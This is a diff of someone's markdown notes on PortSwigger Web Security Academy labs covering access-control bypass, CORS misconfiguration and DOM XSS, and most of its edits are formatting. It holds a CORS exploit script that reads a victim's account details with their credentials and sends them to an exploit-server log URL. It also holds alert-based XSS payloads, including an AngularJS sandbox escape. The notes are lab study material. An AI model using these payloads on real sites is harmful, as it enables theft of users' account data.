@@ -35,7 +35,7 @@ Lab: User role can be modified in user profile:
 - *Custom http headers to override restricted urls*
 
 #### Lab: URL-based access control can be circumvented
-```
+```http
 POST / HTTP/1.1
 Cookie: session=FQxqrQ8PJHEBARHT7se4bxv6sqHGrQJD
 X-Original-URL: /admin
@@ -110,7 +110,6 @@ Login to carlos' account
 #### Lab: Multi-step process with no access control on one step
 
 ```
-
 Login as adminstrator/admin
 Observe request for upgrading a user:
 
@@ -139,7 +138,6 @@ Login as wiener/peter and send the request.
 
 Circumvented using web proxies, VPNs, or manipulation of client-side geolocation mechanisms.
 
------
 
 ### Cross Origin Resource Sharing (CORS)
 
@@ -166,7 +164,7 @@ Circumvented using web proxies, VPNs, or manipulation of client-side geolocation
 
 ** ```normal-website.com``` sends the following cross-origin request: **
 
-```
+```http
 GET /data HTTP/1.1
 Host: robust-website.com
 Origin : https://normal-website.com 
@@ -174,7 +172,7 @@ Origin : https://normal-website.com
 
 ** ```robust-website.com``` replies with: **
 
-```
+```http
 HTTP/1.1 200 OK
 ...
 Access-Control-Allow-Origin: https://normal-website.com 
@@ -186,14 +184,14 @@ Access-Control-Allow-Origin: https://normal-website.com
 - Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality.
 - So some applications take the easy route of effectively allowing access from any other domain.
 
-```
+```http
 GET /sensitive-victim-data HTTP/1.1
 Host: vulnerable-website.com
 Origin: https://malicious-website.com
 Cookie: sessionid=... 
 ```
 
-```
+```http
 HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://malicious-website.com
 Access-Control-Allow-Credentials: true
@@ -207,7 +205,7 @@ Access-Control-Allow-Credentials: true
 3. /my-account?id=admin is blocked
 
 
-```
+```http
 HTTP/1.1 200 OK
 Content-Type: text/html; charset=utf-8
 Cookie: session=RP4LxEeQbjJvfMad0sA9P4ECWmB3r99S
@@ -218,20 +216,14 @@ Access-Control-Allow-Credentials: true
 ```
 
 Go to exploit server:
-```
-<script>
-
-	var req = new XMLHttpRequest();
-	req.onload = reqListener;
-	req.open('get','https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net/accountDetails',true);
-	req.withCredentials = true;
-	req.send();
-
-	function reqListener() {
-		location='//ac401f581f15167f809a0e1701320092.web-security-academy.net/log?key='+this.responseText;
-	};
-
-</script>
+```javascript
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://acf41fe01f16167180030e2a00fd001d.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();function reqListener() {
+	location='//ac401f581f15167f809a0e1701320092.web-security-academy.net/log?key='+this.responseText;
+};
 ```
 
 Submit exploit to victim and go to /log:
@@ -259,7 +251,7 @@ Submit exploit to victim and go to /log:
 
 Send this to the victim.
 
-```
+```javascript
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
@@ -316,7 +308,7 @@ You could chain CORS and XSS as follows
 
 #### Lab: CORS vulnerability with trusted insecure protocols
 
-```
+```javascript
 <script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
@@ -340,7 +332,6 @@ function reqListener() {
 
 ```TBD```
 
------
 
 ## Cross-site Scripting
 
@@ -350,7 +341,7 @@ It allows an attacker to circumvent the same origin policy.
 
 - [Reflected](#reflected-xss)
 - [Stored](#stored-xss)
-- [DOM-based](#dom-xss)
+- [DOM](#dom-xss)
 
 ### Reflected XSS
 
@@ -445,7 +436,7 @@ Includes unsafe data into the DOM.
 
 The sink and source are in embedded javascript within the search page.
 
-```
+```javascript
 function trackSearch(query) {
     document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
 }
@@ -463,13 +454,11 @@ Using this payload ```x"><script>alert(1)</script><img src="x``` the document.wr
 
 Intended solution ```"><svg onload=alert(1)>```
 
-----
-
 #### Lab: DOM XSS in document.write sink using source location.search inside a select element
 
 Relevant code
 
-```
+```javascript
 var stores = ["London","Paris","Milan"];
 var store = (new URLSearchParams(window.location.search)).get('storeId');
 document.write('<select name="storeId">');
@@ -489,7 +478,7 @@ document.write('</select>');
 - As soon as we add it to the query, we get it as an option in select.
 - We will have to close option and select tags and then inject our alert payload.
 
-```
+```html
 <select name="storeId">
 	<option>London</option>
 	<option>Paris</option>
@@ -501,7 +490,6 @@ Working payload ```</option></select><svg onload=alert(1)>```
 
 Intended solution ```"></select><img src=1 onerror=alert(1)>```
 
-----
 
 - The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire.
 - This means you will need to use alternative elements like img or iframe.
@@ -512,7 +500,7 @@ Intended solution ```"></select><img src=1 onerror=alert(1)>```
 
 Relevant code
 
-```
+```javascript
 function doSearchQuery(query) {
     document.getElementById('searchMessage').innerHTML = query;
 }
@@ -526,25 +514,23 @@ Doesn't work ```</span><script>alert(1)</script><span>``` (due to innerHTML rest
 
 Does work ```<img src=1 onerror=alert(1)>```
 
-----
+### jQuery
 
-jQuery ```attr()``` used to change attributes, can act as a sink.
+```attr()``` used to change attributes, can act as a sink.
 
 #### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
 
 > This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
-
+>
 >To solve this lab, make the "back" link alert document.cookie. 
 
 
 Relevant code
 
-```
-<script>
+```javascript
 $(function() {
 	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
 });
-</script>
 ```
 
 Putting ```/feedback?returnPath=javascript:alert(1)``` pops alert on clicking the link, but we need a 0-click payload.
@@ -553,7 +539,7 @@ Doesn't work ```/feedback?returnPath="><img src=x onerror=alert(1)><a href="```
 
 Works ```/feedback?returnPath=javascript:onload=alert(document.cookie)```
 
-----
+### AngularJS
 
 - ```ng-app``` attribute is processed by AngularJS.
 - Anything within ```{{}}``` will be executed.
@@ -563,9 +549,9 @@ Works ```/feedback?returnPath=javascript:onload=alert(document.cookie)```
 [link](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
 
 > This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
-
+>
 > AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
-
+>
 > To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.
 
 Using Wappalyzer, I found out that the AngularJS version is 1.7.7 and from the below blog post by Gareth Heyes I found out the corresponding payload in Angular >= 1.6.0 which has removed the sandbox.
@@ -574,5 +560,5 @@ Using Wappalyzer, I found out that the AngularJS version is 1.7.7 and from the b
 
 ```{{constructor.constructor('alert(1)')()}}```
 
-----
+
 
